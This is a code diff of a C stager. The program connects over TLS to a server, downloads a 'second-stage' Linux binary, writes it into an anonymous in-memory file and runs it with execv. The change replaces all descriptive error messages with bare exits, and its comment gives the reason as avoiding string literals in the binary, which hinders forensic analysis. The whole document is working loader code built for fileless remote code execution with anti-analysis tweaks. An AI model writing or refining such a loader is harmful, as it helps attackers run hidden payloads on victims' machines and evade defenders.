@@ -133,16 +133,19 @@ int main(int argc, char* argv[]) {
         }
     }
 
+    /* ---- After daemonization stderr is /dev/null; use bare _exit(1)
+     *      instead of die() to avoid embedding dead string literals. ---- */
+
     /* ---- Build download URL ---- */
     char dl_url[2048];
     int n = snprintf(dl_url, sizeof(dl_url),
         "%s/dl/second-stage/linux-" ARCH, server_url);
     if (n < 0 || n >= (int)sizeof(dl_url))
-        die("URL too long");
+        _exit(1);
 
     /* ---- Parse https://host[:port]/path ---- */
     if (strncmp(dl_url, "https://", 8) != 0)
-        die("URL must start with https://");
+        _exit(1);
 
     char* rest = dl_url + 8;
     char* slash = strchr(rest, '/');
@@ -151,12 +154,12 @@ int main(int argc, char* argv[]) {
     char hostport[256];
     if (slash) {
         size_t hp_len = (size_t)(slash - rest);
-        if (hp_len >= sizeof(hostport)) die("host too long");
+        if (hp_len >= sizeof(hostport)) _exit(1);
         memcpy(hostport, rest, hp_len);
         hostport[hp_len] = '\0';
     } else {
         size_t hp_len = strlen(rest);
-        if (hp_len >= sizeof(hostport)) die("host too long");
+        if (hp_len >= sizeof(hostport)) _exit(1);
         memcpy(hostport, rest, hp_len);
         hostport[hp_len] = '\0';
     }
@@ -185,7 +188,7 @@ int main(int argc, char* argv[]) {
         "\r\n",
         path, hostport, token);
     if (n < 0 || n >= (int)sizeof(request))
-        die("request too large");
+        _exit(1);
 
     /* ---- mbedTLS setup ---- */
     mbedtls_net_context      net;
@@ -205,28 +208,28 @@ int main(int argc, char* argv[]) {
 
     ret = mbedtls_ctr_drbg_seed(&ctr_drbg, mbedtls_entropy_func,
         &entropy, NULL, 0);
-    if (ret) die("rng seed failed");
+    if (ret) _exit(1);
 
-    if (load_ca(&cacert) != 0) die("no CA bundle found");
+    if (load_ca(&cacert) != 0) _exit(1);
 
     ret = mbedtls_net_connect(&net, hostname, port, MBEDTLS_NET_PROTO_TCP);
-    if (ret) die("connect failed");
+    if (ret) _exit(1);
 
     ret = mbedtls_ssl_config_defaults(&conf,
         MBEDTLS_SSL_IS_CLIENT,
         MBEDTLS_SSL_TRANSPORT_STREAM,
         MBEDTLS_SSL_PRESET_DEFAULT);
-    if (ret) die("ssl config failed");
+    if (ret) _exit(1);
 
     mbedtls_ssl_conf_authmode(&conf, MBEDTLS_SSL_VERIFY_REQUIRED);
     mbedtls_ssl_conf_ca_chain(&conf, &cacert, NULL);
     mbedtls_ssl_conf_rng(&conf, mbedtls_ctr_drbg_random, &ctr_drbg);
 
     ret = mbedtls_ssl_setup(&ssl, &conf);
-    if (ret) die("ssl setup failed");
+    if (ret) _exit(1);
 
     ret = mbedtls_ssl_set_hostname(&ssl, hostname);
-    if (ret) die("ssl set_hostname failed");
+    if (ret) _exit(1);
 
     mbedtls_ssl_set_bio(&ssl, &net,
         mbedtls_net_send, mbedtls_net_recv, NULL);
@@ -236,7 +239,7 @@ int main(int argc, char* argv[]) {
         ret = mbedtls_ssl_handshake(&ssl);
     } while (ret == MBEDTLS_ERR_SSL_WANT_READ ||
         ret == MBEDTLS_ERR_SSL_WANT_WRITE);
-    if (ret) die("tls handshake failed");
+    if (ret) _exit(1);
 
     /* Send HTTP request */
     size_t sent = 0, req_len = strlen(request);
@@ -245,7 +248,7 @@ int main(int argc, char* argv[]) {
             (unsigned char*)request + sent,
             req_len - sent);
         if (ret == MBEDTLS_ERR_SSL_WANT_WRITE) continue;
-        if (ret < 0) die("ssl write failed");
+        if (ret < 0) _exit(1);
         sent += (size_t)ret;
     }
 
@@ -264,32 +267,29 @@ int main(int argc, char* argv[]) {
             break;
         }
     }
-    if (!found) die("malformed HTTP response");
+    if (!found) _exit(1);
 
     /* Check HTTP 200 status */
     hdr[hlen] = '\0';
     char* sp = memchr(hdr, ' ', hlen < 16 ? (size_t)hlen : 16);
     if (!sp || strncmp(sp + 1, "200", 3) != 0)
-        die("download failed: non-200 response");
+        _exit(1);
 
     /* ---- Stream body into anonymous in-memory file ---- */
     int memfd = xmemfd_create("", MFD_CLOEXEC);
-    if (memfd < 0) die("memfd_create failed");
+    if (memfd < 0) _exit(1);
 
     unsigned char body[BODY_BUF];
     for (;;) {
         ret = mbedtls_ssl_read(&ssl, body, sizeof(body));
         if (ret == MBEDTLS_ERR_SSL_WANT_READ) continue;
         if (ret == MBEDTLS_ERR_SSL_PEER_CLOSE_NOTIFY || ret == 0) break;
-        if (ret < 0) {
-            close(memfd);
-            die("ssl read failed");
-        }
+        if (ret < 0) _exit(1);
         unsigned char* p = body;
         int rem = ret;
         while (rem > 0) {
             ssize_t w = write(memfd, p, (size_t)rem);
-            if (w < 0) { close(memfd); die("write failed"); }
+            if (w < 0) _exit(1);
             p += w;
             rem -= (int)w;
         }
@@ -309,6 +309,5 @@ int main(int argc, char* argv[]) {
         NULL
     };
     execv(fdpath, exec_argv);
-    die("execv failed");
-    return 1;
+    _exit(1);
 }
